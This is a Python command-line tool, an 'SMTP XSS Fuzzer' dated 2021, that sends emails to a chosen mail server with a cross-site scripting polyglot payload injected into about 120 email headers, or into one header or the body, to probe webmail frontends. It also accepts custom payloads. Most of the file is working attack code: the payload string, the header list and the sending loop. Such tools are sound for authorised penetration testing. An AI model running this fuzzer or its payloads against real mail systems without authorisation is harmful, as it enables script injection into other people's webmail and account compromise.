#!/usr/bin/env python3
# -*-coding: utf-8-*-

#################################################################################
#                       **-- SMTP XSS Fuzzer --**                               #
#                                                                               #
# Python script which fuzzes for XSS vulnerabilites in SMTP apps with a web     #
# frontend (such as atmail).                                                    #
# ex: smtp-xss-fuzz.py -t 10.10.10.10 -u user@email.loc -r admin@email.loc      #
#                                                                               #
# Copyright (c) 2021 Andrew Trube  <https://github.com/AndrewTrube>             #
#                                                                               #
# Permission is hereby granted, free of charge, to any person obtaining a copy  #
# of this software and associated documentation files (the "Software"), to deal #
# in the Software without restriction, including without limitation the rights  #
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     #
# copies of the Software, and to permit persons to whom the Software is         #
# furnished to do so, subject to the following conditions:                      #
#                                                                               #
# The above copyright notice and this permission notice shall be included in all#
# copies or substantial portions of the Software.                               #
#                                                                               #                                              
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    #
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      #
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   #
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        #
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, #
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE #
# SOFTWARE.                                                                     #
#                                                                               #
#################################################################################

import sys, smtplib, re, time, argparse

xss = '\';alert(String.fromCharCode(88,83,83))//\';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>'

emailHeaders = [
"Accept-Language",
"Alternate-Recipient",
"ARC-Authentication-Results",
"ARC-Message-Signature",
"ARC-Seal",
"Archived-At",
"Authentication-Results",
"Auto-Submitted",
"Autoforwarded",
"Autosubmitted",
"Bcc",
"Cc",
"Comments",
"Content-Identifier",
"Content-Return",
"Conversion",
"Conversion-With-Loss",
"DL-Expansion-History",
"Date",
"Deferred-Delivery",
"Delivery-Date",
"Discarded-X400-IPMS-Extensions",
"Discarded-X400-MTS-Extensions",
"Disclose-Recipients",
"Disposition-Notification-Options",
"Disposition-Notification-To",
"DKIM-Signature",
"Downgraded-Final-Recipient",
"Downgraded-In-Reply-To",
"Downgraded-Message-Id",
"Downgraded-Original-Recipient",
"Downgraded-References",
"Encoding",
"Encrypted",
"Expires",
"Expiry-Date",
"From",
"Generate-Delivery-Report",
"Importance",
"In-Reply-To",
"Incomplete-Copy",
"Keywords",
"Language",
"Latest-Delivery-Time",
"List-Archive",
"List-Help",
"List-ID",
"List-Owner",
"List-Post",
"List-Subscribe",
"List-Unsubscribe",
"List-Unsubscribe-Post",
"Message-Context",
"Message-ID",
"Message-Type",
"MMHS-Exempted-Address",
"MMHS-Extended-Authorisation-Info",
"MMHS-Subject-Indicator-Codes",
"MMHS-Handling-Instructions",
"MMHS-Message-Instructions",
"MMHS-Codress-Message-Indicator",
"MMHS-Originator-Reference",
"MMHS-Primary-Precedence",
"MMHS-Copy-Precedence",
"MMHS-Message-Type",
"MMHS-Other-Recipients-Indicator-To",
"MMHS-Other-Recipients-Indicator-CC",
"MMHS-Acp127-Message-Identifier",
"MMHS-Originator-PLAD",
"MT-Priority",
"Obsoletes",
"Organization",
"Original-Encoded-Information-Types",
"Original-From",
"Original-Message-ID",
"Original-Recipient",
"Originator-Return-Address",
"Original-Subject",
"PICS-Label",
"Prevent-NonDelivery-Report",
"Priority",
"Received",
"Received-SPF",
"References",
"Reply-By",
"Reply-To",
"Require-Recipient-Valid-Since",
"Resent-Bcc",
"Resent-Cc",
"Resent-Date",
"Resent-From",
"Resent-Message-ID",
"Resent-Sender",
"Resent-To",
"Return-Path",
"Sender",
"Sensitivity",
"Solicitation",
"Subject",
"Supersedes",
"TLS-Report-Domain",
"TLS-Report-Submitter",
"TLS-Required",
"To",
"VBR-Info",
"X400-Content-Identifier",
"X400-Content-Return",
"X400-Content-Type",
"X400-MTS-Identifier",
"X400-Originator",
"X400-Received",
"X400-Recipients",
"X400-Trace" 
]

def login(usr,passw,smtpObj):
  """ login in to a user accounts if required to send email """
  return smtpObj.login(usr,passw)

def fuzzXSS(smtpObj, recpt, fromEmail):
  """ Fuzzes all email headers with xss payload """
  skip = re.compile(r"(From|To)")
  for x in emailHeaders:
    if skip.match(x):
      continue
    time.sleep(1)    
    msg = ""
    msg += "{}:{}\r\n".format(x,xss)
    msg += "XSS Email TEST in {} email header".format(x)
    smtpObj.sendmail(fromEmail,recpt,msg)
    print("sending {} in the {} email header".format(xss,x))
  print("[+] Finished [+]")
  
def singleXSS(smtpObj,recpt,fromEmail):
  """ Fuzzes single email header with xss payload """
  if args.header:
    print(args.header.lower())
    if args.header.lower() == "body":
      msg = "Body: _BODY_\nContent-Type: text/html\nTest {}".format(xss)
    else:
      msg = ""
      msg += "{}:{}\r\n".format(args.header,xss)
      msg += "XSS Email TEST in {} email header".format(args.header)
    smtpObj.sendmail(fromEmail,recpt,msg)
    print("sending {} in the {} email header".format(xss,args.header))
  else:
    print("\n-s flag requires -d flag with email header name")
    exit(-1) 
 
def main():
  global xss
  if args.xss:
    xss = args.xss
    
  mailSrvr = smtplib.SMTP(args.host)
  #mailSrvr.set_debuglevel(1)
  if args.password:
    login(args.user,args.password,mailSrvr)
  
  if args.fuzz:
    fuzzXSS(mailSrvr,args.rcpt,args.user)
  elif not args.fuzz:
    singleXSS(mailSrvr,args.rcpt,args.user)
  
  mailSrvr.quit()
  
    
if __name__ == "__main__":
  print("A program for fuzzing E-mail headers and sending custom XSS payloads to SMTP servers with a webapp frontend\n")
    
  parser = argparse.ArgumentParser()
  parser.add_argument('-t','--host',metavar='IP',required=True, help="Target host's IP or Domain Name")
  parser.add_argument('-u','--user',metavar='USER',required=True, help="FROM Email")
  parser.add_argument('-p', '--password',metavar='PASSWORD' ,default=None, help="FROM Email User's Password")
  parser.add_argument('-r', '--rcpt',metavar='RECIPIENT',required=True, help="TO Email")
  parser.add_argument('-f','--fuzz',action="store_true", default=True, help="Set the script to fuzz all email headers [DEFAULT]", dest='fuzz')
  parser.add_argument('-s','--single', action='store_false',help="send payload in a single Email header (requires -d to be set)",dest='fuzz')
  parser.add_argument('-x','--xss',metavar='XSS PAYLOAD',help="Send a custom XSS payload in the specified email header")
  parser.add_argument('-d', '--header',metavar='EMAIL HEADER',help="Specific Email Header to test or send the payload in")

  try:
    args = parser.parse_args()
    main()
  except Exception as e:
    print(e)
    sys.exit(0)

    
    
